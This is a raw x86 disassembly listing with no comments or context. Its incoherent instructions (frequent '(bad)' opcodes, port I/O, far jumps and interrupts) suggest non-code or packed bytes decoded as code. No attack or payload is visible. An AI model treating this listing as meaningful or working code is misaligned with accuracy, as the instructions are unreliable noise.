  420ca8:	cmp    BYTE PTR [ecx+esi*4],dl
  420cab:	push   0x5f
  420cad:	lods   al,BYTE PTR ds:[esi]
  420cae:	mov    eax,0x84aa9c42
  420cb3:	imul   edx,eax,0x54633784
  420cb9:	jg     0x420cb6
  420cbb:	ss in  eax,0xa9
  420cbe:	rol    DWORD PTR [esi],0xcf
  420cc1:	xchg   ecx,eax
  420cc2:	dec    ebx
  420cc3:	inc    ecx
  420cc4:	xor    BYTE PTR [edx],dl
  420cc6:	mov    al,ds:0x9d53dbcb
  420ccb:	lods   eax,DWORD PTR ds:[esi]
  420ccc:	adc    DWORD PTR [ecx],esi
  420cce:	mov    ebp,0x74cf0600
  420cd3:	cmp    ah,cl
  420cd5:	addr16 inc ecx
  420cd7:	in     al,dx
  420cd8:	adc    ebp,DWORD PTR [edi+ebx*1+0x5436b57c]
  420cdf:	loopne 0x420d15
  420ce1:	popf   
  420ce2:	dec    ecx
  420ce3:	mov    eax,DWORD PTR [edi-0x3e465495]
  420ce9:	pop    ds
  420cea:	(bad)  
  420ceb:	jecxz  0x420cb6
  420ced:	into   
  420cee:	sbb    BYTE PTR [ecx],al
  420cf0:	mov    edx,0xbeb57cb9
  420cf5:	les    ecx,FWORD PTR ds:0x2fd8146c
  420cfb:	mov    al,0xfc
  420cfd:	dec    ebp
  420cfe:	sbb    BYTE PTR [ecx-0x2b041b9],bh
  420d04:	mov    edx,0xe40b6c58
  420d09:	jg     0x420d15
  420d0b:	es jns 0x420d2d
  420d0e:	lock icebp 
  420d10:	addr16 dec ebp
  420d12:	ja     0x420d8a
  420d14:	icebp  
  420d15:	sub    edi,edi
  420d17:	aas    
  420d18:	and    ah,BYTE PTR [edx+0x3b654210]
  420d1e:	sbb    BYTE PTR [edx-0x7b01b5fb],0x5d
  420d25:	lds    eax,FWORD PTR ds:0xade51df5
  420d2b:	leave  
  420d2c:	inc    ecx
  420d2d:	idiv   DWORD PTR [eax-0x26]
  420d30:	xchg   bl,bh
  420d32:	inc    ebp
  420d33:	outs   dx,BYTE PTR ds:[esi]
  420d34:	push   0xffffff81
  420d36:	xor    edi,edx
  420d38:	popa   
  420d39:	out    0x56,al
  420d3b:	out    dx,al
  420d3c:	and    edi,esi
  420d3e:	fld    QWORD PTR [eax]
  420d40:	xor    edx,DWORD PTR ds:0xb9d3f91f
  420d46:	ret    
  420d47:	div    BYTE PTR [ebp+0x7a9c381f]
  420d4d:	pop    ebx
  420d4e:	shl    DWORD PTR [ecx+0x386c402c],cl
  420d54:	or     al,0x4d
  420d56:	imul   esi,DWORD PTR [eax-0x5a],0x505760ac
  420d5d:	mov    ch,BYTE PTR [edx+0x31]
  420d60:	jle    0x420d26
  420d62:	jmp    0x250d552c
  420d67:	mov    cl,0xef
  420d69:	fsubr  QWORD PTR [eax-0x63904266]
  420d6f:	push   ebx
  420d70:	jno    0x420d8a
  420d72:	(bad)  
  420d73:	jno    0x420d18
  420d75:	outs   dx,DWORD PTR ds:[esi]
  420d76:	sahf   
  420d77:	(bad)  
  420d78:	and    ax,WORD PTR [ebp+ecx*2+0xd2cd381]
  420d80:	jl     0x420d3f
  420d82:	in     eax,dx
  420d83:	add    al,0x20
  420d85:	out    dx,eax
  420d86:	pop    ds
  420d87:	out    dx,al
  420d88:	jp     0x420dda
  420d8a:	bound  eax,QWORD PTR ds:0x2b61539c
  420d90:	add    ebp,ecx
  420d92:	sbb    DWORD PTR [esi],edx
  420d94:	fild   QWORD PTR [edx]
  420d96:	dec    esp
  420d97:	xchg   ecx,eax
  420d98:	aad    0xe5
  420d9a:	gs retf 0x8b61
  420d9e:	mov    ebx,?
  420da0:	(bad)
  420da3:	sar    BYTE PTR [ebp-0x17],0x88
  420da7:	mov    al,ds:0xf18920c7
  420dac:	sub    eax,0x35db19fa
  420db1:	imul   ebp,DWORD PTR [edi],0x4042a0f1
  420db7:	(bad)  
  420db8:	xchg   esi,ebx
  420dba:	sub    BYTE PTR [edi+edx*2+0x36feecfd],ah
  420dc1:	or     eax,0xdff4cae5
  420dc6:	xchg   edi,eax
  420dc7:	cmp    DWORD PTR [esi],esi
  420dc9:	cmp    cl,BYTE PTR [edx-0x45d6509d]
  420dcf:	cmp    esi,DWORD PTR [ebx+0x46]
  420dd2:	mov    cl,0x13
  420dd4:	mov    ebp,DWORD PTR [edi]
  420dd6:	(bad)  
  420dd7:	pop    esi
  420dd8:	leave  
  420dd9:	push   edi
  420dda:	test   BYTE PTR [ebx],0xf7
  420ddd:	int    0x62
  420ddf:	or     BYTE PTR [edi+0x61],ah
  420de2:	pop    edx
  420de3:	and    al,0x65
  420de5:	inc    ecx
  420de6:	push   ecx
  420de7:	or     eax,0xb8947406
  420dec:	sbb    bl,dl
  420dee:	das    
  420def:	xchg   edi,eax
  420df0:	jmp    0x420e4e
  420df2:	jge    0x420da4
  420df4:	outs   dx,DWORD PTR ds:[esi]
  420df5:	cld    
  420df6:	hlt    
  420df7:	inc    ebp
  420df8:	pop    ecx
  420df9:	dec    edi
  420dfa:	fisub  DWORD PTR [eax]
  420dfc:	and    cl,ah
  420dfe:	cmp    al,0x36
  420e00:	ss ins BYTE PTR es:[edi],dx
  420e02:	shl    BYTE PTR [edx+0x667df31d],1
  420e08:	cmp    DWORD PTR [edi-0x61e46950],eax
  420e0e:	gs dec ebx
  420e10:	cdq    
  420e11:	pop    ds
  420e12:	sti    
  420e13:	data16 cli 
  420e15:	adc    eax,0xed8a2739
  420e1a:	iret   
  420e1b:	pop    ebp
  420e1c:	push   es
  420e1d:	jo     0x420e07
  420e1f:	je     0x420e61
  420e21:	call   0x4b6:0xbedff6f8
  420e28:	add    DWORD PTR [edx+0x1933b05c],0x6ad4e0a2
  420e32:	cmc    
  420e33:	int    0x3b
  420e35:	aaa    
  420e36:	mov    esp,0xcf64de78
  420e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e3c:	mov    bh,0xcb
  420e3e:	scas   eax,DWORD PTR es:[edi]
  420e3f:	jl     0x420dcc
  420e41:	and    BYTE PTR [esi-0x46],0x44
  420e45:	out    dx,al
  420e46:	push   esp
  420e47:	loop   0x420e63
  420e49:	cmp    ebp,DWORD PTR [esi]
  420e4b:	and    dh,BYTE PTR [edx]
  420e4d:	aas    
  420e4e:	jmp    0xd2f5:0x1d2d80d
  420e55:	sub    BYTE PTR [ecx+ebx*4+0x66],dh
  420e59:	stos   DWORD PTR es:[edi],eax
  420e5a:	in     al,0xc9
  420e5c:	xchg   edx,eax
  420e5d:	scas   al,BYTE PTR es:[edi]
  420e5e:	pop    ebx
  420e5f:	inc    edi
  420e60:	test   eax,0x1ac5073f
  420e65:	xchg   ebx,eax
  420e66:	push   ds
  420e67:	cmp    eax,0x1c74f7a0
  420e6c:	in     al,0x9
  420e6e:	sbb    esp,DWORD PTR [esi+0x5]
  420e71:	into   
  420e72:	mov    edi,0x47bf2f16
  420e77:	dec    esp
  420e78:	retf   0xec81
  420e7b:	clc    
  420e7c:	inc    esi
  420e7d:	inc    esp
  420e7e:	rol    ecx,0xa7
  420e81:	mov    ?,ebx
  420e83:	ss int 0xef
  420e86:	outs   dx,BYTE PTR ds:[esi]
  420e87:	test   BYTE PTR [eax+0x18fa950c],dl
  420e8d:	pushf  
  420e8e:	inc    edi
  420e8f:	fwait
  420e90:	mov    cl,0x56
  420e92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e93:	cmp    al,0x2b
  420e95:	mov    ds:0xe86c044,al
  420e9a:	lods   al,BYTE PTR ds:[esi]
  420e9b:	push   ebx
  420e9c:	sbb    dh,BYTE PTR [edi-0x67be083a]
  420ea2:	add    BYTE PTR [ebx-0x167a3186],0x1b
  420ea9:	test   DWORD PTR [edi],ebx
  420eab:	pop    ss
  420eac:	xor    al,0x9f
  420eae:	into   
  420eaf:	hlt    
  420eb0:	and    BYTE PTR [edi+0xe92cac2],dh
  420eb6:	aaa    
  420eb7:	jno    0x420ef1
  420eb9:	js     0x420eb1
  420ebb:	sub    eax,0x248ccc17
  420ec0:	jne    0x420ee6
  420ec2:	mov    edi,0x9f523362
  420ec7:	rol    BYTE PTR [ebx+esi*8],1
  420eca:	mov    dh,0x2
  420ecc:	cmp    BYTE PTR [esi+0x2d206eae],bl
  420ed2:	push   0x7a39ad98
  420ed7:	leave  
  420ed8:	in     al,dx
  420ed9:	xor    eax,0xf02a50cf
  420ede:	mov    ah,ch
  420ee0:	cli    
  420ee1:	mov    ss,WORD PTR [ebx]
  420ee3:	ins    DWORD PTR es:[edi],dx
  420ee4:	je     0x420e81
  420ee6:	pop    es
  420ee7:	jmp    0xd07d:0x72407bd6
  420eee:	ret    0xca15
  420ef1:	jbe    0x420f09
  420ef3:	dec    esi
  420ef4:	(bad)  
  420ef5:	fs xor al,0x67
  420ef8:	test   BYTE PTR [eax],bl
  420efa:	dec    esi
  420efb:	xor    ch,0xca
  420efe:	or     eax,0xcad81c16
  420f03:	ins    DWORD PTR es:[edi],dx
  420f04:	sub    al,0xd3
  420f06:	or     ebx,DWORD PTR [edi-0x41]
  420f09:	(bad)  
  420f0a:	jmp    0x569f2cc
  420f0f:	dec    eax
  420f10:	mov    ch,BYTE PTR [ecx-0x67f5662d]
  420f16:	inc    ebx
  420f17:	sar    al,cl
  420f19:	adc    BYTE PTR [ebp+0x53a79825],ch
  420f1f:	xor    al,0x1
  420f21:	ins    BYTE PTR es:[edi],dx
  420f22:	mov    dl,0xaf
  420f24:	sub    bh,BYTE PTR [edi]
  420f26:	inc    esp
  420f27:	xchg   ebp,eax
  420f28:	loop   0x420ec0
  420f2a:	fs (bad) 
  420f2c:	into   
  420f2d:	add    edx,DWORD PTR [ebx+0x114c395b]
  420f33:	mov    eax,ds:0x72c6b4d1
  420f38:	call   0xba1acfe3
  420f3d:	ins    BYTE PTR es:[edi],dx
  420f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f3f:	xor    DWORD PTR [edx+0x50b8c479],ebp
  420f45:	fidivr DWORD PTR [edx]
  420f47:	shr    BYTE PTR [ecx-0x41],1
  420f4a:	lods   al,BYTE PTR ds:[esi]
  420f4b:	xchg   esi,eax
  420f4c:	out    dx,eax
  420f4d:	addr16 push ds
  420f4f:	dec    esi
  420f50:	adc    ebp,DWORD PTR [edi+0xc]
  420f53:	(bad)  
  420f54:	cmp    ch,BYTE PTR [ebx-0x5042a0bd]
  420f5a:	call   FWORD PTR [eax-0x24]
  420f5d:	xor    edi,DWORD PTR [ebp+edx*1-0x2a]
  420f61:	sub    al,0x30
  420f63:	shrd   DWORD PTR [esi-0x36b8fb3b],esi,cl
  420f6a:	mov    WORD PTR [esi],ds
  420f6c:	xchg   ebp,eax
  420f6d:	dec    esp
  420f6e:	vmwrite esp,DWORD PTR [edx+0x57]
  420f72:	out    dx,al
  420f73:	jp     0x420fa4
  420f75:	sbb    DWORD PTR [esi+0x51c2916],esp
  420f7b:	sub    esp,DWORD PTR [ebx-0x56]
  420f7e:	mov    esi,0x4db29463
  420f83:	test   BYTE PTR [ecx+esi*8],ah
  420f86:	test   ch,0x18
  420f89:	(bad)  
  420f8a:	mov    tr7,esp
  420f8d:	lods   eax,DWORD PTR ds:[esi]
  420f8e:	sbb    al,0x13
  420f90:	add    DWORD PTR [ecx+edx*2],ebx
  420f93:	push   0xb4df4331
  420f98:	mov    bl,0x4f
  420f9a:	aam    0x55
  420f9c:	les    edx,FWORD PTR [ecx]
  420f9e:	in     al,0xe9
  420fa0:	jecxz  0x420fdf
  420fa2:	xchg   BYTE PTR [ecx+edx*1],dl
  420fa5:	sbb    BYTE PTR [edx],0xc5
  420fa8:	cdq    
  420fa9:	frndint 
  420fab:	cmp    BYTE PTR [edi],ah
  420fad:	fwait
  420fae:	mov    dh,0xb7
  420fb0:	sub    DWORD PTR [eax+0x73e8c4d1],ebp
  420fb6:	cmp    al,0x29
  420fb8:	or     edx,eax
  420fba:	mov    WORD PTR [edi],cs
  420fbc:	inc    ebx
  420fbd:	pop    ebp
  420fbe:	sbb    DWORD PTR [eax],ebx
  420fc0:	stos   DWORD PTR es:[edi],eax
  420fc1:	shl    DWORD PTR [esi],1
  420fc3:	and    edx,ecx
  420fc5:	sbb    BYTE PTR [ecx+0x18cf85a],cl
  420fcb:	dec    ecx
  420fcc:	cmp    eax,0x657bbb8f
  420fd1:	(bad)  [esi+0x68f53f3]
  420fd7:	xchg   ebx,eax
  420fd8:	mov    ebp,0xc2dc0f6d
  420fdd:	hlt    
  420fde:	mov    edi,0x8edceace
  420fe3:	enter  0xc5ed,0xab
  420fe7:	push   0x11
  420fe9:	ucomiss xmm2,DWORD PTR [ebp-0x21]
  420fed:	sahf   
  420fee:	jno    0x420fa3
  420ff0:	sub    eax,0xd7a314c9
  420ff5:	lahf   
  420ff6:	pop    eax
  420ff7:	sbb    BYTE PTR [edi+0x64],ch
  420ffa:	jns    0x421029
  420ffc:	xor    eax,0xfc227b48
  421001:	gs dec edi
  421003:	xchg   ebx,eax
  421004:	mov    gs,ebx
  421006:	adc    eax,0x4eae8a92
  42100b:	jmp    0x16b95fdf
  421010:	cmc    
  421011:	adc    BYTE PTR [edx+0x56],al
  421014:	repnz dec ebp
  421016:	cdq    
  421017:	pusha  
  421018:	ret    
  421019:	(bad)  
  42101a:	pop    ebp
  42101b:	push   cs
  42101c:	adc    BYTE PTR gs:[ebp+0x57404da8],0x57
  421024:	pushf  
  421025:	dec    eax
  421026:	jmp    0x86f35724
  42102b:	icebp  
  42102c:	push   edi
  42102d:	adc    BYTE PTR [edi-0x1f],al
  421030:	stos   BYTE PTR es:[edi],al
  421031:	ins    BYTE PTR es:[edi],dx
  421032:	jno    0x420fe4
  421034:	fiadd  DWORD PTR [ecx-0x65f7ce97]
  42103a:	aaa    
  42103b:	popf   
  42103c:	mov    ds:0xb8507a4c,eax
  421041:	adc    dh,dl
  421043:	dec    ecx
  421044:	push   ebx
  421045:	add    BYTE PTR [esi+0x61],0xab
  421049:	in     al,0xfb
  42104b:	dec    ebx
  42104c:	or     bh,cl
  42104e:	cmp    eax,0x6d9f483
  421053:	push   cs
  421054:	into   
  421055:	scas   al,BYTE PTR es:[edi]
  421056:	jbe    0x421046
  421058:	fistp  DWORD PTR [esi+0x4d]
  42105b:	test   al,0xbe
  42105d:	mov    es,WORD PTR [eax]
  42105f:	mov    ds:0xc8e85d85,al
  421064:	fistp  WORD PTR [ebp-0xf]
  421067:	enter  0x4a9a,0x0
  42106b:	pop    ecx
  42106c:	push   ebx
  42106d:	and    BYTE PTR [eax],ch
  42106f:	inc    edx
  421070:	add    esi,edi
  421072:	push   0x215d6ed5
  421077:	or     BYTE PTR [ebp+0x1b],dl
  42107a:	inc    ebp
  42107b:	sbb    BYTE PTR [esi-0x2],dl
  42107e:	or     bh,ch
  421080:	mov    ecx,0x68abab1a
  421085:	and    ebp,DWORD PTR [edx]
  421087:	ins    BYTE PTR es:[edi],dx
  421088:	in     eax,dx
  421089:	shl    cl,1
  42108b:	and    edi,eax
  42108d:	fiadd  WORD PTR [ebp+0x22e47d08]
  421093:	(bad)  
  421094:	mov    gs,WORD PTR [ecx-0x21]
  421097:	fdiv   DWORD PTR [ebx-0x14]
  42109a:	sbb    DWORD PTR [esi-0x44],edx
  42109d:	push   ebp
  42109e:	sbb    eax,0x91e02687
  4210a3:	in     eax,0x71
  4210a5:	in     al,0x12
  4210a7:	mov    edx,0xb7251456
  4210ac:	push   edx
  4210ad:	sub    cl,BYTE PTR [ebx+0xd]
  4210b0:	push   0xf2acbed3
  4210b5:	mov    esp,0xc622d87
  4210ba:	pop    eax
  4210bb:	xor    ecx,DWORD PTR [ebx]
  4210bd:	and    ebx,DWORD PTR [ebx+0x349334db]
  4210c3:	sti    
  4210c4:	jae    0x42108c
  4210c6:	adc    BYTE PTR [edi-0x1155818f],al
  4210cc:	mov    bl,0x10
  4210ce:	scas   eax,DWORD PTR es:[edi]
  4210cf:	inc    esi
  4210d0:	jmp    0x5447:0xd864ef92
  4210d7:	adc    eax,0x6098a4b6
  4210dc:	inc    ebp
  4210dd:	and    BYTE PTR [ecx],cl
  4210df:	shl    BYTE PTR ss:[ebx+0x6e],0xce
  4210e4:	xchg   esp,eax
  4210e5:	push   0x11958515
  4210ea:	jmp    0x421076
  4210ec:	js     0x42114e
  4210ee:	jp     0x421140
  4210f0:	pop    ds
  4210f1:	(bad)  
  4210f2:	xor    al,0xd3
  4210f4:	sbb    esp,edx
  4210f6:	scas   al,BYTE PTR es:[edi]
  4210f7:	push   es
  4210f8:	inc    ebx
  4210f9:	lock add al,0xe4
  4210fc:	push   esi
  4210fd:	xor    BYTE PTR [edi-0x275386ce],0x2d
  421104:	pop    ss
  421105:	dec    ebp
  421106:	(bad)  
  421107:	sub    al,BYTE PTR [edi+0x74b717eb]
  42110d:	es int 0xe
  421110:	push   0xbda94e43
  421115:	inc    ecx
  421116:	cdq    
  421117:	imul   esp,DWORD PTR [ebx+0x27],0xffffff86
  42111b:	mov    esi,0xb65be940
  421120:	jmp    0x6432b1e7
  421125:	std    
  421126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421127:	fbld   TBYTE PTR [edi-0xb33eaa5]
  42112d:	ins    DWORD PTR es:[edi],dx
  42112e:	or     DWORD PTR [esi],edx
  421130:	and    DWORD PTR [eax-0x77ea4de],ebp
  421136:	add    cl,dh
  421138:	scas   eax,DWORD PTR es:[edi]
  421139:	mov    ebx,0xf93c387a
  42113e:	cmp    bl,BYTE PTR [ecx-0x476a59fe]
  421144:	and    al,0x18
  421146:	inc    edi
  421147:	cli    
  421148:	leave  
  421149:	inc    edx
  42114a:	push   cs
  42114b:	outs   dx,BYTE PTR ds:[esi]
  42114c:	fstp   QWORD PTR [bx+si]
  42114f:	aaa    
  421150:	jns    0x4211c9
  421152:	test   DWORD PTR [edx],edi
  421154:	add    eax,edx
  421156:	mov    edx,0x80c5fe95
  42115b:	mov    edx,0xd464f4ad
  421160:	mov    ebp,0x9cd9de2c
  421165:	inc    ebp
  421166:	out    dx,al
  421167:	push   edx
  421168:	das    
  421169:	sti    
  42116a:	and    ah,BYTE PTR [ebx+0x7c10ce71]
  421170:	cmp    al,BYTE PTR [ebp-0x5895caa4]
  421176:	in     al,dx
  421177:	addr16 jmp 0x6f13:0xabe02ecd
  42117f:	push   edi
  421180:	rol    BYTE PTR [ebp-0x72],cl
  421183:	jae    0x42116a
  421185:	pop    ss
  421186:	xor    bl,BYTE PTR [ebx+0x2b]
  421189:	cmp    ah,BYTE PTR [eax+0x11]
  42118c:	pop    edi
  42118d:	scas   al,BYTE PTR es:[edi]
  42118e:	repz push ecx
  421190:	and    dh,al
  421192:	ins    DWORD PTR es:[edi],dx
  421193:	sub    eax,0xf0957523
  421198:	call   0x694d:0xe77b9a50
  42119f:	fldenv [ebp+0x12]
  4211a2:	mov    gs,WORD PTR [eax+0x52ced9ac]
  4211a8:	out    0xf6,eax
  4211aa:	inc    ebp
  4211ab:	add    bl,BYTE PTR [edi+0x1dd82e5b]
  4211b1:	ret    
  4211b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211b3:	mov    dh,0x78
  4211b5:	sub    dl,BYTE PTR [ebp-0x23c08afb]
  4211bb:	movsx  eax,ah
  4211be:	add    BYTE PTR [edi-0x61],dh
  4211c1:	popa   
  4211c2:	mov    edx,0x96136edb
  4211c7:	out    dx,eax
  4211c8:	pusha  
  4211c9:	xchg   edi,eax
  4211ca:	xor    DWORD PTR [edx+ebx*8],eax
  4211cd:	dec    esi
  4211ce:	mov    sp,0xacab
  4211d2:	sub    dl,cl
  4211d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211d5:	sbb    DWORD PTR [ecx-0x71388f4a],0x242a3ec1
  4211df:	jmp    0x421221
  4211e1:	(bad)  
  4211e2:	jmp    0x42121f
  4211e4:	out    0x77,eax
  4211e6:	aas    
  4211e7:	mov    ecx,0x39892bbd
  4211ec:	push   0x73b91710
  4211f1:	scas   al,BYTE PTR es:[edi]
  4211f2:	addr16 out 0xf3,al
  4211f5:	pop    ds
  4211f6:	xor    ah,dl
  4211f8:	sbb    BYTE PTR [ecx+0x57],bh
  4211fb:	into   
  4211fc:	jo     0x42126f
  4211fe:	mov    ah,0x4d
  421200:	push   esi
  421201:	xchg   BYTE PTR [eax+0x75896b91],dl
  421207:	add    dh,cl
  421209:	mov    ebx,0xdad779a8
  42120e:	jb     0x4211b6
  421210:	(bad)  
  421211:	ja     0x4211a0
  421213:	jg     0x421219
  421215:	out    0x41,al
  421217:	lock idiv DWORD PTR [edi+0x6b663045]
  42121e:	dec    esp
  42121f:	sahf   
  421220:	out    dx,eax
  421221:	mov    bh,0xf7
  421223:	js     0x42121f
  421225:	mov    ebx,0x580a52fc
  42122a:	aam    0xc7
  42122c:	retf   0x7f01
  42122f:	hlt    
  421230:	loopne 0x421249
  421232:	cli    
  421233:	jg     0x421262
  421235:	retf   
  421236:	(bad)  
  421237:	je     0x421226
  421239:	(bad)
  42123c:	loope  0x421245
  42123e:	add    DWORD PTR [ebx],eax
  421240:	pop    es
  421241:	out    dx,al
  421242:	inc    edi
  421243:	cmp    ebp,edx
  421245:	lock outs dx,BYTE PTR ds:[esi]
  421247:	or     ecx,DWORD PTR [ecx+0x100ebcb5]
  42124d:	pushf  
  42124e:	(bad)  
  42124f:	xor    BYTE PTR [esi-0x4fe2e82],cl
  421255:	aam    0x16
  421257:	add    esp,edx
  421259:	icebp  
  42125a:	add    eax,0x22d8a710
  42125f:	jge    0x42124e
  421261:	mov    ds:0xbb6b0e3a,al
  421266:	std    
  421267:	cmp    DWORD PTR [ebx+0x68],edx
  42126a:	push   ebp
  42126b:	jmp    0x6386c742
  421270:	imul   ecx,edx,0x849afdd2
  421276:	or     dh,BYTE PTR [esp+edx*1-0x5a0f4dee]
  42127d:	xchg   ebx,eax
  42127e:	test   BYTE PTR [ebx-0x33a1ba7d],0x9a
  421285:	cmp    bl,BYTE PTR [ebx-0x598174cb]
  42128b:	out    dx,al
  42128c:	mov    esi,0x22f62c3
  421291:	ror    DWORD PTR [ebp-0x4a],cl
  421294:	inc    ebp
  421295:	ds jne 0x42124b
  421298:	ins    BYTE PTR es:[edi],dx
  421299:	jmp    0xde75:0xd4c8a55e
  4212a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212a1:	push   ds
  4212a2:	mov    dh,BYTE PTR [eax-0x20]
  4212a5:	call   FWORD PTR [edx-0x1e]
  4212a8:	dec    ebp
  4212a9:	mov    ah,0x43
  4212ab:	inc    ecx
  4212ac:	xor    BYTE PTR [edx-0x47],0xe9
  4212b0:	push   esi
  4212b1:	mov    dl,BYTE PTR [ecx+0x5fae7f50]
  4212b7:	cdq    
  4212b8:	sbb    ch,al
  4212ba:	ret    
  4212bb:	cdq    
  4212bc:	lods   eax,DWORD PTR ds:[esi]
  4212bd:	jecxz  0x4212c7
  4212bf:	pop    eax
  4212c0:	pop    ecx
  4212c1:	jp     0x4212bf
  4212c3:	sahf   
  4212c4:	pop    ss
  4212c5:	(bad)  
  4212c7:	pop    ds
  4212c8:	add    ch,BYTE PTR [edx]
  4212ca:	dec    ebp
  4212cb:	mov    bl,0x33
  4212cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212ce:	jns    0x421314
  4212d0:	popw   es
  4212d2:	mov    bh,0x54
  4212d4:	loopne 0x42125c
  4212d6:	or     BYTE PTR [eax-0x3a207072],0x2c
  4212dd:	jnp    0x4212d6
  4212df:	jb     0x421324
  4212e1:	popa   
  4212e2:	test   BYTE PTR [ebp+eiz*1+0x7bd1a677],dl
  4212e9:	jge    0x42131b
  4212eb:	pusha  
  4212ec:	loopne 0x421364
  4212ee:	sahf   
  4212ef:	and    eax,0x866521a8
  4212f4:	ficomp DWORD PTR [ecx+0x4cda60ff]
  4212fa:	es test ebp,ecx
  4212fd:	cmp    eax,0x2c0b4b18
  421302:	cmp    BYTE PTR [ebp+0x154985d7],al
  421308:	cmp    al,0xb8
  42130a:	add    cl,BYTE PTR [ebp+0x26]
  42130d:	(bad)  
  42130e:	xlat   BYTE PTR ds:[ebx]
  42130f:	and    bh,BYTE PTR [esi+0x70]
  421312:	cmc    
  421313:	mov    ebp,0x70e61e37
  421318:	jmp    0x713a968f
  42131d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42131e:	int3   
  42131f:	inc    edi
  421320:	leave  
  421321:	and    BYTE PTR [ebp+0x435393b7],bl
  421327:	and    dh,bh
  421329:	xchg   bl,ch
  42132b:	data16 jae 0x4212c4
  42132e:	lea    edx,[eax+0x2e]
  421331:	test   eax,0x98499f7e
  421336:	test   DWORD PTR [ecx+0x16],0xdcc9d727
  42133d:	cmp    al,0x10
  42133f:	ret    0xae6e
  421342:	daa    
  421343:	mov    cl,0xa1
  421345:	loope  0x4213b2
  421347:	push   eax
  421348:	cmp    eax,0x123487bf
  42134d:	arpl   WORD PTR [ecx],dx
  42134f:	arpl   WORD PTR [edx],di
  421351:	xchg   DWORD PTR [edx-0x17ccfdc1],ecx
  421357:	sbb    al,0x97
  421359:	and    BYTE PTR [esi],0x49
  42135c:	xlat   BYTE PTR ds:[ebx]
  42135d:	inc    esp
  42135e:	push   esp
  42135f:	sbb    al,BYTE PTR [ebp+ecx*2-0x5bd0d8a3]
  421366:	adc    BYTE PTR [esi],0x51
  421369:	mov    bh,0xfa
  42136b:	int    0x98
  42136d:	mov    ds:0x415dde20,eax
  421372:	ficom  WORD PTR [ecx-0x7a974033]
  421378:	aas    
  421379:	mov    ah,0xf2
  42137b:	into   
  42137c:	(bad)  
  42137d:	(bad)  
  42137e:	cmp    DWORD PTR [esi+0x59],ebx
  421381:	add    al,0x25
  421383:	fwait
  421384:	inc    eax
  421385:	xchg   ebp,eax
  421386:	mov    eax,0xd508aefc
  42138b:	in     al,dx
  42138c:	cli    
  42138d:	rol    BYTE PTR [eax-0x53],cl
  421390:	dec    ecx
  421391:	dec    edi
  421392:	fist   WORD PTR [ecx]
  421394:	icebp  
  421395:	out    dx,al
  421396:	add    cl,BYTE PTR [eax]
  421398:	jge    0x421332
  42139a:	dec    edx
  42139b:	mov    al,0x40
  42139d:	pop    es
  42139e:	fisttp WORD PTR [ecx-0x27]
  4213a1:	aam    0xca
  4213a3:	mov    BYTE PTR [edi-0x5b],dl
  4213a6:	or     ch,BYTE PTR [edi+0x4fcad19a]
  4213ac:	xchg   DWORD PTR [esi-0x1ab142fe],ecx
  4213b2:	xor    eax,0x912b6c31
  4213b7:	mov    eax,ds:0x7af9ca09
  4213bc:	cld    
  4213bd:	inc    esp
  4213be:	or     bl,BYTE PTR [edi+0x3a]
  4213c1:	mov    bh,0x67
  4213c3:	dec    ebx
  4213c4:	pop    ss
  4213c5:	push   ds
  4213c6:	mov    bh,0x6e
  4213c8:	bound  esi,QWORD PTR [esi+0x79fe4de4]
  4213ce:	div    esp
  4213d0:	sub    eax,0xdb73126f
  4213d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213d6:	stos   BYTE PTR es:[edi],al
  4213d7:	pop    ds
  4213d8:	inc    ebp
  4213d9:	xchg   ebp,eax
  4213da:	xchg   ecx,eax
  4213db:	fst    QWORD PTR [edi-0x72]
  4213de:	pop    eax
  4213df:	dec    edx
  4213e0:	in     al,dx
  4213e1:	push   ebx
  4213e2:	aas    
  4213e3:	jecxz  0x4213a5
  4213e5:	mov    bl,0x6d
  4213e7:	ror    BYTE PTR [esi+ebx*2],0x45
  4213eb:	test   al,0x6e
  4213ed:	es mov bh,0x12
  4213f0:	popf   
  4213f1:	mov    esp,0x5dd1adb0
  4213f6:	add    BYTE PTR [ecx+0x4d],ah
  4213f9:	pop    edx
  4213fa:	ins    DWORD PTR es:[edi],dx
  4213fb:	push   es
  4213fc:	test   al,0xad
  4213fe:	pop    ecx
  4213ff:	fsub   QWORD PTR [edx+ebp*8+0x45]
  421403:	aas    
  421404:	inc    esp
  421405:	scas   eax,DWORD PTR es:[edi]
  421406:	pop    ebx
  421407:	scas   al,BYTE PTR es:[edi]
  421408:	loope  0x421444
  42140a:	or     al,BYTE PTR [edi+0x3d4af26d]
  421410:	fisub  WORD PTR [esi]
  421412:	shl    DWORD PTR [edi-0x4752cb44],1
  421418:	jae    0x42142b
  42141a:	add    al,0x8
  42141c:	pop    ss
  42141d:	xor    al,0xa1
  42141f:	arpl   di,dx
  421421:	adc    ecx,ecx
  421423:	pop    es
  421424:	popa   
  421425:	lds    esi,FWORD PTR [ecx]
  421427:	and    bl,al
  421429:	(bad)  
  42142a:	pushf  
  42142b:	mov    ch,0xe4
  42142d:	mov    ds:0xb78932bf,eax
  421432:	fsub   QWORD PTR [eax-0x10e7f28b]
  421438:	push   ebx
  421439:	dec    ebx
  42143a:	pop    es
  42143b:	mov    al,0xa7
  42143d:	and    ecx,DWORD PTR [edi]
  42143f:	js     0x4213f6
  421441:	les    eax,FWORD PTR [edi-0xb]
  421444:	xchg   DWORD PTR [edi-0x3a],edi
  421447:	ror    bh,cl
  421449:	int    0xdf
  42144b:	mov    al,0x7d
  42144d:	icebp  
  42144e:	push   ds
  42144f:	(bad)  
  421450:	sub    al,0x96
  421452:	inc    edx
  421453:	push   ebx
  421454:	cmp    BYTE PTR [ebx+ecx*4+0x147e9e05],0x80
  42145c:	dec    ebp
  42145d:	sti    
  42145e:	jmp    FWORD PTR [edx]
  421460:	sbb    DWORD PTR [eax-0x48bb92ea],edx
  421466:	dec    esp
  421467:	loop   0x4214cb
  421469:	arpl   WORD PTR [ecx-0x65],dx
  42146c:	into   
  42146d:	xor    edi,DWORD PTR [ebx]
  42146f:	mov    ebx,0x6f52580e
